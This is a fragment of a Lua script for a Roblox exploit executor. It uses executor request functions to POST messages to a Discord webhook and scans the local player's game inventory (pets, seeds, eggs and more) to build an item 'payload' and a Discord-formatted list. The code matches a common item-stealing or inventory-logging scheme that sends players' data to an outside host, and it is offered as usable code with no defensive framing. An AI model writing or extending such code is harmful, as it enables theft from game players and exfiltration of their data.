-- Discord Sender Function
local function sendToDiscord(messageText)
    task.spawn(function()
        local payload = {["content"] = messageText}
        pcall(function()
            local requestFunc = syn and syn.request or http_request or request
            if requestFunc then
                requestFunc({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

-- Scanner (Multi-Select Payload Builder)
local categories = {"Pets", "Sprinklers", "WateringCans", "Mushrooms", "Gnomes", "Raccoons", "Crates", "SeedPacks", "Trowels", "Props", "Seeds", "HarvestedFruits", "EmptyPots", "Eggs"}
local function buildMultiSelectPayload()
    local payload = {}
    local discordList = {}
    local replica = PlayerStateClient:GetLocalReplica()
    
    if replica and replica.Data and replica.Data.Inventory then
        local inventory = replica.Data.Inventory
        for _, category in ipairs(categories) do
            local catData = inventory[category]
            if typeof(catData) == "table" then
                for itemKey, itemValue in pairs(catData) do
                    local count = 1
                    if typeof(itemValue) == "table" then
                        count = itemValue.Quantity or itemValue.Amount or itemValue.Count or itemValue.Value or 1
                    elseif typeof(itemValue) == "number" then
                        count = itemValue
                    end
                    
                    if count > 0 then
                        table.insert(payload, {
                            Category = category,
                            ItemKey = itemKey,
                            Count = count
                        })
                        table.insert(discordList, "📦 " .. itemKey .. " (" .. tostring(count) .. "x)")
                    end
                end
            end
        end
    end
    return payload, discordList
end

